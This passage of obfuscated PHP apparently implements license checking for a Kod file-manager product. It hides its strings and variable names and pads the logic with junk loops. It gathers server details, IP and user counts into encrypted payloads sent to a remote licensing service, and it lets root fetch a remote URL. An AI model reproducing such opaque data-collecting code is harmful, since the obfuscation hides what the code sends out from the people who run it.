$îÏ±…Ó[54], $îÏ±…Ó[55], $îÏ±…Ó[56], $îÏ±…Ó[57], $îÏ±…Ó[58], $îÏ±…Ó[59], $îÏ±…Ó[60], $îÏ±…Ó[61], $îÏ±…Ó[62], $îÏ±…Ó[63], $îÏ±…Ó[64], $îÏ±…Ó[65], $îÏ±…Ó[66], $îÏ±…Ó[67], $îÏ±…Ó[68], $îÏ±…Ó[69], $îÏ±…Ó[70], $îÏ±…Ó[71], $îÏ±…Ó[72], $îÏ±…Ó[73], $îÏ±…Ó[74], $îÏ±…Ó[75], $îÏ±…Ó[76], $îÏ±…Ó[77], $îÏ±…Ó[78], $îÏ±…Ó[79], $îÏ±…Ó[80], $îÏ±…Ó[81], $îÏ±…Ó[82], $îÏ±…Ó[83], $îÏ±…Ó[84], $îÏ±…Ó[85], $îÏ±…Ó[86], $îÏ±…Ó[87]); $×»ù¨Ñ = $ì¥İ—–›[736]; while ($×»ù¨Ñ < $ì¥İ—–›[719]) { if ($×»ù¨Ñ >= 0) { break; } $×»ù¨Ñ++; } foreach ($õ¥“Ğòë as $÷°šÄë™) { $Âí×—© = $GLOBALS[$îÏ±…Ó[88]][$îÏ±…Ó[89]][$÷°šÄë™]; $Ïú—­ë½ = $ì¥İ—–›[737]; if (strlen($Ïú—­ë½) < $ì¥İ—–›[711]) { die; } if (isset($ù·Ø²ˆú[$÷°šÄë™])) { $Âí×—© = $ù·Ø²ˆú[$÷°šÄë™]; } $À¡§ Òí[$îÏ±…Ó[90]][$îÏ±…Ó[91]][$÷°šÄë™] = $Âí×—©; } $ÏÁçÕ = $À¡§ Òí[$îÏ±…Ó[90]][$îÏ±…Ó[91]][$îÏ±…Ó[46]]; $Ùø»êŠº = $ì¥İ—–›[738]; while (strlen($Ùø»êŠº) < $ì¥İ—–›[493]) { if (!$Ùø»êŠº) { break; } $Ùø»êŠº++; } unset($À¡§ Òí[$îÏ±…Ó[90]][$îÏ±…Ó[92]][$îÏ±…Ó[93]]); $×Òæıû‹ = $ì¥İ—–›[739]; unset($À¡§ Òí[$îÏ±…Ó[90]][$îÏ±…Ó[92]][$îÏ±…Ó[94]]); $¾İüôá° = $ì¥İ—–›[740]; if (strlen($¾İüôá°) < $ì¥İ—–›[711]) { return; } unset($À¡§ Òí[$îÏ±…Ó[90]][$îÏ±…Ó[91]][$îÏ±…Ó[46]]); unset($À¡§ Òí[$îÏ±…Ó[90]][$îÏ±…Ó[91]][$îÏ±…Ó[95]]); $À¡§ Òí[$îÏ±…Ó[90]][$îÏ±…Ó[91]][$îÏ±…Ó[96]] = array($îÏ±…Ó[97] => (int) $ÏÁçÕ[$îÏ±…Ó[98]], $îÏ±…Ó[99] => (int) _get($ÏÁçÕ, $îÏ±…Ó[100], 0)); $¬ÏÌ˜¬ = substr(md5($îÏ±…Ó[101] . get_client_ip() . $ù·Ø²ˆú[$îÏ±…Ó[102]]), 0, 15); $µ¼±ÉÌã = $ì¥İ—–›[741]; if (strlen($µ¼±ÉÌã) < $ì¥İ—–›[716]) { die; } $À¡§ Òí[$îÏ±…Ó[103]][$îÏ±…Ó[104]] = Mcrypt::encode(Session::sign(), $¬ÏÌ˜¬, 3600 * 24); $À¡§ Òí[$îÏ±…Ó[103]][$îÏ±…Ó[105]] = Action($îÏ±…Ó[106])->accessToken(); $†ºèãØ® = $ì¥İ—–›[742]; if (strlen($†ºèãØ®) < $ì¥İ—–›[719]) { die; } $À¡§ Òí[$îÏ±…Ó[103]][$îÏ±…Ó[107]] = md5($_SERVER[$îÏ±…Ó[108]] . $ù·Ø²ˆú[$îÏ±…Ó[102]]); $À¡§ Òí[$îÏ±…Ó[103]][$îÏ±…Ó[109]] = base64_encode(serverInfo()); $À¡§ Òí[$îÏ±…Ó[103]][$îÏ±…Ó[110]] = $this->bxpnfb55515a; $è˜îîıê = $ì¥İ—–›[743]; while (strlen($è˜îîıê) < $ì¥İ—–›[716]) { if (!$è˜îîıê) { break; } $è˜îîıê++; } if ($ù·Ø²ˆú[$îÏ±…Ó[110]] != $îÏ±…Ó[111]) { $À¡§ Òí[$îÏ±…Ó[103]][$îÏ±…Ó[112]] = $ù·Ø²ˆú[$îÏ±…Ó[112]]; $À¡§ Òí[$îÏ±…Ó[103]][$îÏ±…Ó[113]] = $ù·Ø²ˆú[$îÏ±…Ó[113]]; $ğ€ıÙ»Â = rand_string(10) . $this->bxpnfb55515a . rand_string(5); $À¡§ Òí[$îÏ±…Ó[90]][$îÏ±…Ó[114]][$îÏ±…Ó[115]] = $this->dhbs37d8f324($ğ€ıÙ»Â, $À¡§ Òí[$îÏ±…Ó[103]][$îÏ±…Ó[107]]); } if ($this->bxpnfb55515a == $îÏ±…Ó[111]) { $À¡§ Òí[$îÏ±…Ó[90]][$îÏ±…Ó[91]][$îÏ±…Ó[96]][$îÏ±…Ó[100]] = 0; } $À¡§ Òí[$îÏ±…Ó[103]][$îÏ±…Ó[116]] = $this->versionPluginFilter(); $À¡§ Òí[$îÏ±…Ó[103]][$îÏ±…Ó[117]] = _get($this->dykna2511562, $îÏ±…Ó[118], $îÏ±…Ó[6]); $íÙ×Åìü = $ì¥İ—–›[744]; while (strlen($íÙ×Åìü) < $ì¥İ—–›[722]) { if (!$íÙ×Åìü) { break; } $íÙ×Åìü++; } if (KodUser::isRoot() && $this->config[$îÏ±…Ó[119]]) { $À¡§ Òí[$îÏ±…Ó[103]][$îÏ±…Ó[120]] = WEB_ROOT; } return $À¡§ Òí; } private function svhe2f476a87() { $ÂÈÇï’ =& $_SERVER[Ï×Œõ”û]; $×˜Õ§â =& $_SERVER[É‹íîÃÊ]; $şà÷ÇÑæ = $_SERVER[$×˜Õ§â[24]] == $×˜Õ§â[121]; $Ö³ãÏ‰· = $ÂÈÇï’[745]; if ($_SERVER[$×˜Õ§â[24]] == $×˜Õ§â[122] && $_GET[$×˜Õ§â[123]] == $×˜Õ§â[124]) { $şà÷ÇÑæ = !0; } if ($şà÷ÇÑæ) { $ÎšºÃ¹ó = array($×˜Õ§â[110] => $this->bxpnfb55515a, $×˜Õ§â[125] => $this->asdif87cc794(), $×˜Õ§â[126] => Model($×˜Õ§â[127])->count()); if ($this->bxpnfb55515a != $×˜Õ§â[111]) { $—öÒÍõÅ = _get($this->dykna2511562, $×˜Õ§â[128]); if ($—öÒÍõÅ) { $ÎšºÃ¹ó[$×˜Õ§â[129]] = $—öÒÍõÅ; $ÎšºÃ¹ó[$×˜Õ§â[130]] = strtotime(_get($this->dykna2511562, $×˜Õ§â[131])); $ÎšºÃ¹ó[$×˜Õ§â[132]] = _get($this->dykna2511562, $×˜Õ§â[118]); } $ŸäÆ¯¤å = Model($×˜Õ§â[33])->get($×˜Õ§â[133], $×˜Õ§â[6], !0); if (is_string($ŸäÆ¯¤å) && substr($ŸäÆ¯¤å, 0, 1) == $×˜Õ§â[134]) { $ŸäÆ¯¤å = json_decode_force($ŸäÆ¯¤å); } if (is_array($ŸäÆ¯¤å) && $ŸäÆ¯¤å[$×˜Õ§â[135]] && strstr($ŸäÆ¯¤å[$×˜Õ§â[135]], $×˜Õ§â[136])) { $ŞÀ¡Ñ”ã = explode($×˜Õ§â[136], $ŸäÆ¯¤å[$×˜Õ§â[135]]); $ÎšºÃ¹ó[$×˜Õ§â[137]] = $ŞÀ¡Ñ”ã[0]; } } $ÎšºÃ¹ó = $this->vtew66607566(json_encode($ÎšºÃ¹ó), md5($×˜Õ§â[138])); $ÎÖ¾Æô¨ = $ÂÈÇï’[746]; if (!$ÎÖ¾Æô¨) { die; } $ÏÎ‹äÇ« = array($×˜Õ§â[139] => $ÎšºÃ¹ó); $´¾Ó‘§º = $ÂÈÇï’[747]; while (strlen($´¾Ó‘§º) < $ÂÈÇï’[711]) { if (!$´¾Ó‘§º) { break; } $´¾Ó‘§º++; } call_user_func(array($×˜Õ§â[140], $×˜Õ§â[141]), $ÏÎ‹äÇ«); $ÜñšÉ±Á = $ÂÈÇï’[748]; while (strlen($ÜñšÉ±Á) < $ÂÈÇï’[493]) { if (!$ÜñšÉ±Á) { break; } $ÜñšÉ±Á++; } } if ($this->bxpnfb55515a == $×˜Õ§â[111]) { return; } $¨…ÆæñÍ = array($×˜Õ§â[142], $×˜Õ§â[143], $×˜Õ§â[144], $×˜Õ§â[145], $×˜Õ§â[146], $×˜Õ§â[147]); $¿‹æ‹ùŒ = Model($×˜Õ§â[33])->get(); $ı£”ÌÎñ = $ÂÈÇï’[749]; while ($ı£”ÌÎñ < $ÂÈÇï’[719]) { if ($ı£”ÌÎñ >= 0) { break; } $ı£”ÌÎñ++; } $ÏÎ‹äÇ« = array($×˜Õ§â[148] => $¿‹æ‹ùŒ[$×˜Õ§â[34]], $×˜Õ§â[149] => $¿‹æ‹ùŒ[$×˜Õ§â[35]], $×˜Õ§â[150] => $×˜Õ§â[6]); $ß‰Ä€ŒÄ = $ÂÈÇï’[750]; while (strlen($ß‰Ä€ŒÄ) < $ÂÈÇï’[711]) { if (!$ß‰Ä€ŒÄ) { break; } $ß‰Ä€ŒÄ++; } foreach ($¨…ÆæñÍ as $Í»µ‡ïù) { if (!isset($¿‹æ‹ùŒ[$Í»µ‡ïù]) || !$¿‹æ‹ùŒ[$Í»µ‡ïù]) { continue; } $ÏÎ‹äÇ«[$Í»µ‡ïù] = $¿‹æ‹ùŒ[$Í»µ‡ïù]; $™…“¯” = $ÂÈÇï’[751]; while ($™…“¯” < $ÂÈÇï’[711]) { if ($™…“¯” >= 0) { break; } $™…“¯”++; } } call_user_func(array($×˜Õ§â[140], $×˜Õ§â[141]), $ÏÎ‹äÇ«); } private function ygvi70d7185b() { $îòµ·¿ =& $_SERVER[Ï×Œõ”û]; $ ©£çÈã =& $_SERVER[É‹íîÃÊ]; if ($_SERVER[$ ©£çÈã[24]] != $ ©£çÈã[151]) { return; } if (!KodUser::isRoot()) { die; } $ÙüÎ÷¾ = $GLOBALS[$ ©£çÈã[13]]; if (isset($ÙüÎ÷¾[$ ©£çÈã[152]])) { $this->habu93fe28b8(); die; } if (isset($ÙüÎ÷¾[$ ©£çÈã[153]]) && isset($ÙüÎ÷¾[$ ©£çÈã[153]]) == $ ©£çÈã[124]) { $ÙüÎ÷¾[$ ©£çÈã[154]] = Model($ ©£çÈã[33])->get($ ©£çÈã[155]); } if (!isset($ÙüÎ÷¾[$ ©£çÈã[154]]) || strlen($ÙüÎ÷¾[$ ©£çÈã[154]]) != 16) { show_json($ ©£çÈã[156] . $ÙüÎ÷¾[$ ©£çÈã[154]], !1); } $û¾’úóø = Model($ ©£çÈã[33])->get($ ©£çÈã[102]); $øÍèÎîØ = md5($_SERVER[$ ©£çÈã[108]] . $û¾’úóø); $®÷Òç®Æ = $îòµ·¿[752]; $ÁÅ‰‘şº = array($ ©£çÈã[154] => $ÙüÎ÷¾[$ ©£çÈã[154]], $ ©£çÈã[157] => rand_string(16), $ ©£çÈã[158] => $ ©£çÈã[138], $ ©£çÈã[159] => $ ©£çÈã[160], $ ©£çÈã[161] => $_SERVER[$ ©£çÈã[162]], $ ©£çÈã[163] => $_SERVER[$ ©£çÈã[164]], $ ©£çÈã[165] => $_SERVER[$ ©£çÈã[166]], $ ©£çÈã[107] => $øÍèÎîØ, $ ©£çÈã[167] => Model($ ©£çÈã[33])->get($ ©£çÈã[133])); if (isset($ÙüÎ÷¾[$ ©£çÈã[153]]) && isset($ÙüÎ÷¾[$ ©£çÈã[153]]) == $ ©£çÈã[124]) { $ÁÅ‰‘şº[$ ©£çÈã[153]] = md5($ÁÅ‰‘şº[$ ©£çÈã[154]] . $ ©£çÈã[168] . $ÁÅ‰‘şº[$ ©£çÈã[157]]); } if ($ÙüÎ÷¾[$ ©£çÈã[169]] == $ ©£çÈã[170]) { $Õ·á¸î¼ = $this->vtew66607566($øÍèÎîØ, $ ©£çÈã[171]); $…ÈãÓòı = $this->dhbs37d8f324(json_encode($ÁÅ‰‘şº), $øÍèÎîØ . $ ©£çÈã[172], 3); $…ÈãÓòı = $…ÈãÓòı . $ ©£çÈã[173] . $_SERVER[$ ©£çÈã[162]]; $Ü²Ğ·â = $this->sulm1beb2536($ ©£çÈã[174] . $Õ·á¸î¼ . $ ©£çÈã[175] . $…ÈãÓòı, -1); show_json($Ü²Ğ·â, !0); } else { if ($ÙüÎ÷¾[$ ©£çÈã[169]] == $ ©£çÈã[176]) { $ÈëÒè¤ = substr(md5($ ©£çÈã[177] . $øÍèÎîØ), 12, 15) . $ ©£çÈã[178]; $…ÈãÓòı = $this->bpms88d8f41e(trim($ÙüÎ÷¾[$ ©£çÈã[179]]), $ÈëÒè¤, 2); $Üİ®é¸ = json_decode($…ÈãÓòı, !0); if (!is_array($Üİ®é¸) || !is_array($Üİ®é¸[$ ©£çÈã[180]]) || $Üİ®é¸[$ ©£çÈã[154]] != !0) { $ÈêÃ¹ì = $ ©£çÈã[181]; $°òÔ§úã = $Üİ®é¸[$ ©£çÈã[180]] ? $ ©£çÈã[182] . $Üİ®é¸[$ ©£çÈã[180]] : $ÈêÃ¹ì; show_json($°òÔ§úã, !1); } else { $ÁÅ‰‘şº[$ ©£çÈã[157]] = $Üİ®é¸[$ ©£çÈã[180]][$ ©£çÈã[183]]; } } else { $Üİ®é¸ = $this->sulm1beb2536($ ©£çÈã[184], $ÁÅ‰‘şº, 10); } } if (!is_array($Üİ®é¸) || !is_array($Üİ®é¸[$ ©£çÈã[180]]) || $Üİ®é¸[$ ©£çÈã[154]] != !0) { $ÈêÃ¹ì = LNG($ ©£çÈã[185]); $°òÔ§úã = $Üİ®é¸[$ ©£çÈã[180]] ? $ ©£çÈã[182] . $Üİ®é¸[$ ©£çÈã[180]] : $ÈêÃ¹ì; show_json($°òÔ§úã, !1); } $¡èû¾¥¿ = $Üİ®é¸[$ ©£çÈã[180]]; $îùÔÚŠ = $this->olvj2226025a($¡èû¾¥¿[$ ©£çÈã[186]]); if (!$îùÔÚŠ || $îùÔÚŠ != $¡èû¾¥¿[$ ©£çÈã[131]]) { $ë¬ÜÂÓú = array($ ©£çÈã[187] => Model($ ©£çÈã[33])->get($ ©£çÈã[102]), $ ©£çÈã[188] => $_SERVER[$ ©£çÈã[108]], $ ©£çÈã[189] => this_url(), $ ©£çÈã[163] => $_SERVER[$ ©£çÈã[164]]); $…ÈãÓòı = $this->qjph56fb17b3(json_encode($ë¬ÜÂÓú)); $this->sulm1beb2536($ ©£çÈã[190] . $…ÈãÓòı); show_json(LNG($ ©£çÈã[191]), !0); } $œ˜²¢îŞ = array($ ©£çÈã[155] => $¡èû¾¥¿[$ ©£çÈã[192]], $ ©£çÈã[193] => $¡èû¾¥¿[$ ©£çÈã[194]], $ ©£çÈã[195] => rand_string(16), $ ©£çÈã[110] => $¡èû¾¥¿[$ ©£çÈã[196]]); if ($ÁÅ‰‘şº[$ ©£çÈã[157]]) { $œ˜²¢îŞ[$ ©£çÈã[195]] = $ÁÅ‰‘şº[$ ©£çÈã[157]]; } $ÏÍ¡ãú = substr(md5($œ˜²¢îŞ[$ ©£çÈã[193]]), 10, 10); $‚¿àë‚¯ = $ÏÍ¡ãú . $œ˜²¢îŞ[$ ©£çÈã[110]] . $œ˜²¢îŞ[$ ©£çÈã[195]]; $°ˆ‡ò­Ö = $îòµ·¿[753]; if (!$°ˆ‡ò­Ö) { die; } $œ˜²¢îŞ[$ ©£çÈã[112]] = strrev(base64_encode($this->vtew66607566($‚¿àë‚¯, $ ©£çÈã[197]))); $è•‰©áß = $îòµ·¿[754]; if (strlen($è•‰©áß) < $îòµ·¿[716]) { die; } $„×ÈÆì = rand_string(16); $ì¹°Ûü¿ = $îòµ·¿[755]; $©¨ºš©“ = $„×ÈÆì . $œ˜²¢îŞ[$ ©£çÈã[110]] . $this->vtew66607566(md5($œ˜²¢îŞ[$ ©£çÈã[155]]), $„×ÈÆì); $œ˜²¢îŞ[$ ©£çÈã[113]] = base64_encode(strrev($this->vtew66607566($©¨ºš©“, $ ©£çÈã[198]))); $§õßäíà = $îòµ·¿[756]; while ($§õßäíà < $îòµ·¿[711]) { if ($§õßäíà >= 0) { break; } $§õßäíà++; } if ($¡èû¾¥¿[$ ©£çÈã[199]] && $¡èû¾¥¿[$ ©£çÈã[199]] >= 1) { Model($ ©£çÈã[33])->setDeep($ ©£çÈã[200], $ ©£çÈã[124]); } Model($ ©£çÈã[33])->set($œ˜²¢îŞ); $îŠƒõÉ = md5($_SERVER[$ ©£çÈã[108]] . strrev($û¾’úóø) . $œ˜²¢îŞ[$ ©£çÈã[193]]); $ÑÉå¥ûå = strrev(substr($îŠƒõÉ, 10, 16)); $Ğ¼øçí¶ = $this->dhbs37d8f324(json_encode($¡èû¾¥¿), $îŠƒõÉ); $¦Úõœ‚œ = $îòµ·¿[757]; $¡–ªÙƒ = array_to_keyvalue(Model($ ©£çÈã[7])->listData(), $ ©£çÈã[201]); $ÄõºÉÛö = $îòµ·¿[758]; while ($ÄõºÉÛö < $îòµ·¿[716]) { if ($ÄõºÉÛö >= 0) { break; } $ÄõºÉÛö++; } $½çªæñš = $¡–ªÙƒ[$ ©£çÈã[202]]; $òø–ÒµÆ = $îòµ·¿[759]; if (strlen($òø–ÒµÆ) < $îòµ·¿[493]) { return; } $œ«ŠÓ³´ = array(); $œ«ŠÓ³´[$ÑÉå¥ûå] = $Ğ¼øçí¶; Model($ ©£çÈã[7])->update($½çªæñš[$ ©£çÈã[203]], array($ ©£çÈã[204] => $œ«ŠÓ³´)); $…§…Ô¼í = $îòµ·¿[760]; while ($…§…Ô¼í < $îòµ·¿[719]) { if ($…§…Ô¼í >= 0) { break; } $…§…Ô¼í++; } $this->dykna2511562 = $¡èû¾¥¿; $this->bxpnfb55515a = $œ˜²¢îŞ[$ ©£çÈã[110]]; $this->licenseRegistSuccess(); $”÷°¬Å = $îòµ·¿[761]; Cache::set($ ©£çÈã[205] . md5($û¾’úóø . $ ©£çÈã[206]), $ ©£çÈã[6]); show_json(LNG($ ©£çÈã[191]), !0); $Ûşúî = $îòµ·¿[762]; } private function licenseRegistSuccess() { $ì‡Ø»¯ =& $_SERVER[É‹íîÃÊ]; $ä†£êãÅ = Model($ì‡Ø»¯[33])->get(); $İ¬•†æÚ = $_SERVER[Ï×Œõ”û][763]; if (!$İ¬•†æÚ) { return; } if ($ä†£êãÅ[$ì‡Ø»¯[63]] != $ì‡Ø»¯[124]) { Model($ì‡Ø»¯[33])->set($ì‡Ø»¯[63], $ì‡Ø»¯[124]); } Action($ì‡Ø»¯[207])->initStart(!0); } private function habu93fe28b8() { $ı¨¹ÄÁÏ =& $_SERVER[Ï×Œõ”û]; $ñªïˆĞ§ =& $_SERVER[É‹íîÃÊ]; Model($ñªïˆĞ§[33])->set(array($ñªïˆĞ§[155] => $ñªïˆĞ§[6], $ñªïˆĞ§[193] => $ñªïˆĞ§[6], $ñªïˆĞ§[110] => $ñªïˆĞ§[111], $ñªïˆĞ§[112] => $ñªïˆĞ§[6], $ñªïˆĞ§[113] => $ñªïˆĞ§[6])); Model($ñªïˆĞ§[33])->setDeep($ñªïˆĞ§[200], $ñªïˆĞ§[208]); $ËËŒ£ıû = $ı¨¹ÄÁÏ[764]; while (strlen($ËËŒ£ıû) < $ı¨¹ÄÁÏ[711]) { if (!$ËËŒ£ıû) { break; } $ËËŒ£ıû++; } $this->dykna2511562 = array(); $ÂËá¶µ… = $ı¨¹ÄÁÏ[765]; while (strlen($ÂËá¶µ…) < $ı¨¹ÄÁÏ[711]) { if (!$ÂËá¶µ…) { break; } $ÂËá¶µ…++; } $this->bxpnfb55515a = $ñªïˆĞ§[111]; } private function nfij13a4b833() { $ì—àÙáÒ =& $_SERVER[Ï×Œõ”û]; $âó†šÈ‚ =& $_SERVER[É‹íîÃÊ]; $_SERVER[$âó†šÈ‚[164]] = _get($_SERVER, $âó†šÈ‚[164], APP_HOST); $»ûÚ×Óò = $ì—àÙáÒ[766]; while ($»ûÚ×Óò < $ì—àÙáÒ[716]) { if ($»ûÚ×Óò >= 0) { break; } $»ûÚ×Óò++; } $this->bxpnfb55515a = $âó†šÈ‚[111]; $¿ğ½ğ˜« = Model($âó†šÈ‚[33])->get(); if ($¿ğ½ğ˜«[$âó†šÈ‚[110]] == $âó†šÈ‚[111]) { return; } $¾¬öÀÀı = Model($âó†šÈ‚[33])->get($âó†šÈ‚[102]); $ÄŞØª´Ì = $ì—àÙáÒ[767]; $’µ†ÒÙª = $âó†šÈ‚[205] . md5($¾¬öÀÀı . $âó†šÈ‚[206]); $’¶Ò’²¦ = $ì—àÙáÒ[768]; if (!$’¶Ò’²¦) { return; } $ïÌœ¤Ç¡ = Cache::get($’µ†ÒÙª); if (!is_array($ïÌœ¤Ç¡) || !isset($ïÌœ¤Ç¡[$âó†šÈ‚[209]]) || time() - $ïÌœ¤Ç¡[$âó†šÈ‚[209]] >= 60) { $Ú¢Åùğò = Model($âó†šÈ‚[7])->loadList(); $«ŞÆ“ºè = $Ú¢Åùğò[$âó†šÈ‚[202]]; $Â×¯Ë› = md5($_SERVER[$âó†šÈ‚[108]] . strrev($¾¬öÀÀı) . $¿ğ½ğ˜«[$âó†šÈ‚[193]]); $”ÈèæÈ¾ = strrev(substr($Â×¯Ë›, 10, 16)); $ïÌœ¤Ç¡ = $this->bpms88d8f41e($«ŞÆ“ºè[$âó†šÈ‚[88]][$”ÈèæÈ¾], $Â×¯Ë›); $ïÌœ¤Ç¡ = json_decode($ïÌœ¤Ç¡, !0); } if (!is_array($ïÌœ¤Ç¡)) { return $this->habu93fe28b8(); } $âóÚÍí = strtotime($ïÌœ¤Ç¡[$âó†šÈ‚[131]]); if (time() >= $âóÚÍí) { return $this->habu93fe28b8(); } if (!isset($ïÌœ¤Ç¡[$âó†šÈ‚[209]]) || time() - $ïÌœ¤Ç¡[$âó†šÈ‚[209]] > 20) { $ïÌœ¤Ç¡[$âó†šÈ‚[209]] = time(); Cache::set($’µ†ÒÙª, $ïÌœ¤Ç¡); } $this->dykna2511562 = $ïÌœ¤Ç¡; $this->bxpnfb55515a = $¿ğ½ğ˜«[$âó†šÈ‚[110]]; $GLOBALS[$âó†šÈ‚[210]] = $this; } private function aouzd78644c0() { $œüîˆ¿ı =& $_SERVER[Ï×Œõ”û]; $ª…‹öîñ =& $_SERVER[É‹íîÃÊ]; $‘ŞªÒ» = $GLOBALS[$ª…‹öîñ[13]]; $Íì‹å‘È = $_SERVER[$ª…‹öîñ[24]]; $Ú—¯Æö³ = $œüîˆ¿ı[769]; while (strlen($Ú—¯Æö³) < $œüîˆ¿ı[711]) { if (!$Ú—¯Æö³) { break; } $Ú—¯Æö³++; } if ($Íì‹å‘È == $ª…‹öîñ[211] && $this->bxpnfb55515a == $ª…‹öîñ[111]) { show_json(LNG($ª…‹öîñ[212]), !1, $ª…‹öîñ[213]); } $ÅÃÔ¨¿ = array($ª…‹öîñ[214], $ª…‹öîñ[215]); if (in_array($Íì‹å‘È, $ÅÃÔ¨¿)) { if ($this->bxpnfb55515a == $ª…‹öîñ[111] && isset($‘ŞªÒ»[$ª…‹öîñ[216]])) { show_json(LNG($ª…‹öîñ[212]), !1, $ª…‹öîñ[213]); die; } $œŸÖÄ„ = $this->asdif87cc794(); if ($œŸÖÄ„ != intval($ª…‹öîñ[217])) { if ($œŸÖÄ„ <= Model($ª…‹öîñ[127])->count()) { show_json(LNG($ª…‹öîñ[218]), !1, $ª…‹öîñ[213]); die; } } } } private function geqoc21e4947() { $æĞ¯ÛìÄ =& $_SERVER[Ï×Œõ”û]; $ŸîØ“”­ =& $_SERVER[É‹íîÃÊ]; $·‹†¢Šî = array($ŸîØ“”­[121], $ŸîØ“”­[122]); $‡ô×´øª = $æĞ¯ÛìÄ[770]; if (strlen($‡ô×´øª) < $æĞ¯ÛìÄ[719]) { return; } if (!KodUser::isRoot() || !isset($_GET[$ŸîØ“”­[219]])) { return; } if (!in_array($_SERVER[$ŸîØ“”­[24]], $·‹†¢Šî)) { return; } $¢¹¾³‰ù = $ŸîØ“”­[220]; $ÆƒéÃò± = $æĞ¯ÛìÄ[771]; while ($ÆƒéÃò± < $æĞ¯ÛìÄ[493]) { if ($ÆƒéÃò± >= 0) { break; } $ÆƒéÃò±++; } $¢¹¾³‰ù = $this->aqoz6752ad37($¢¹¾³‰ù, $ŸîØ“”­[221]); $õ¢ƒ¡ú = stream_context_create(array($ŸîØ“”­[222] => array($ŸîØ“”­[223] => $ŸîØ“”­[224], $ŸîØ“”­[225] => 3))); $Â«û•™½ = $æĞ¯ÛìÄ[772]; if (strlen($Â«û•™½) < $æĞ¯ÛìÄ[716]) { die; } $»ú¶õ¡ú = @file_get_contents($¢¹¾³‰ù, !1, $õ¢ƒ¡ú); $Ù‹½­ = $æĞ¯ÛìÄ[773]; if (strlen($Ù‹½­) < $æĞ¯ÛìÄ[719]) { die; } header($ŸîØ“”­[226]); $ó¿İ§Á = $æĞ¯ÛìÄ[774]; if ($»ú¶õ¡ú && strstr($»ú¶õ¡ú, $ŸîØ“”­[227])) { echo $»ú¶õ¡ú; } die; } public function xoua17a2d57c($•µªÎäÇ) { $™ƒ—ÛÏ =& $_SERVER[Ï×Œõ”û]; $û”ÆÌ³ =& $_SERVER[É‹íîÃÊ]; if ($this->bxpnfb55515a == $û”ÆÌ³[228]) { return $•µªÎäÇ; } $ ˜Šº•Ş = $this->versionPluginList(); $ì‡Îã…• = explode($û”ÆÌ³[229], $this->versionPluginFilter()); $ÊĞàĞÌ = $™ƒ—ÛÏ[775]; if (!$ÊĞàĞÌ) { die; } $Ã˜ğİö± = array(); $ ‹—îíë = $™ƒ—ÛÏ[776]; if (strlen($ ‹—îíë) < $™ƒ—ÛÏ[719]) { return; } foreach ($ ˜Šº•Ş as $ıÚº†Õ© => $ãñª¸ãÖ) { if ($ãñª¸ãÖ == $û”ÆÌ³[230] && substr($this->bxpnfb55515a, 0, 1) == $û”ÆÌ³[230]) { continue; } if (!in_array($ıÚº†Õ©, $ì‡Îã…•)) { $Ã˜ğİö±[] = $ıÚº†Õ©; } } foreach ($Ã˜ğİö± as $ıÚº†Õ©) { unset($•µªÎäÇ[$ıÚº†Õ©]); } return $•µªÎäÇ; $¢¾Àâë = $™ƒ—ÛÏ[777]; if (!$¢¾Àâë) { return; } } private function versionPluginList() { $ëí®Õ =& $_SERVER[Ï×Œõ”û]; $—Ä®«Ë‡ =& $_SERVER[É‹íîÃÊ]; return array($—Ä®«Ë‡[231] => $—Ä®«Ë‡[230], $—Ä®«Ë‡[232] => $—Ä®«Ë‡[230], $—Ä®«Ë‡[233] => $—Ä®«Ë‡[230], $—Ä®«Ë‡[234] => $—Ä®«Ë‡[230], $—Ä®«Ë‡[235] => $—Ä®«Ë‡[236], $—Ä®«Ë‡[237] => $—Ä®«Ë‡[236], $—Ä®«Ë‡[238] => $—Ä®«Ë‡[236], $—Ä®«Ë‡[239] => $—Ä®«Ë‡[236], $—Ä®«Ë‡[240] => $—Ä®«Ë‡[236], $—Ä®«Ë‡[241] => $—Ä®«Ë‡[236], $—Ä®«Ë‡[242] => $—Ä®«Ë‡[236], $—Ä®«Ë‡[243] => $—Ä®«Ë‡[236], $—Ä®«Ë‡[244] => $—Ä®«Ë‡[236], $—Ä®«Ë‡[245] => $—Ä®«Ë‡[236], $—Ä®«Ë‡[246] => $—Ä®«Ë‡[236], $—Ä®«Ë‡[247] => $—Ä®«Ë‡[236], $—Ä®«Ë‡[248] => $—Ä®«Ë‡[236], $—Ä®«Ë‡[249] => $—Ä®«Ë‡[236], $—Ä®«Ë‡[250] => $—Ä®«Ë‡[236]); $ü‰‹³Á = $ëí®Õ[778]; if (strlen($ü‰‹³Á) < $ëí®Õ[711]) { die; } } private function versionPluginFilter() { $Í­Ñ‹¥… =& $_SERVER[Ï×Œõ”û]; $ŒÓ×Â§€ =& $_SERVER[É‹íîÃÊ]; if ($this->bxpnfb55515a == $ŒÓ×Â§€[111]) { return $ŒÓ×Â§€[6]; } $ãÕ“œ„‚ = _get($this->dykna2511562, $ŒÓ×Â§€[251], $ŒÓ×Â§€[6]); $Õú¾¤—é = $Í­Ñ‹¥…[779]; while ($Õú¾¤—é < $Í­Ñ‹¥…[716]) { if ($Õú¾¤—é >= 0) { break; } $Õú¾¤—é++; } $½¼‚¤³ª = _get($this->dykna2511562, $ŒÓ×Â§€[118], $ŒÓ×Â§€[6]); $ìÍÔø¹à = $Í­Ñ‹¥…[780]; while ($ìÍÔø¹à < $Í­Ñ‹¥…[722]) { if ($ìÍÔø¹à >= 0) { break; } $ìÍÔø¹à++; } $”ÒßÄ²³ = _get($this->dykna2511562, $ŒÓ×Â§€[252], $ŒÓ×Â§€[6]); if ($½¼‚¤³ª > time() && $”ÒßÄ²³ > time()) { $É§Û âˆ = explode($ŒÓ×Â§€[229], $ãÕ“œ„‚); $Ë³ª¿¶ = array_keys($this->versionPluginList()); $ãÕ“œ„‚ = array_merge($É§Û âˆ, $Ë³ª¿¶); $ãÕ“œ„‚ = implode($ŒÓ×Â§€[229], array_filter(array_unique($ãÕ“œ„‚))); } return $ãÕ“œ„‚; } private function wjsqe628daae() { $„¹îù¥§ =& $_SERVER[É‹íîÃÊ]; if ($this->bxpnfb55515a != $„¹îù¥§[111]) { $GLOBALS[$„¹îù¥§[88]][$„¹îù¥§[92]][$„¹îù¥§[253]] = $„¹îù¥§[208]; return; } $GLOBALS[$„¹îù¥§[88]][$„¹îù¥§[254]] = $„¹îù¥§[124]; if (Model($„¹îù¥§[255])->get($„¹îù¥§[63]) != $„¹îù¥§[208]) { Model($„¹îù¥§[255])->set($„¹îù¥§[63], $„¹îù¥§[208]); } } public function iwqu25002d09() { return $_SERVER[É‹íîÃÊ][256]; } private function uhswb48618ad() { $äßé¼ =& $_SERVER[Ï×Œõ”û]; $ìùŠÍ‘¢ =& 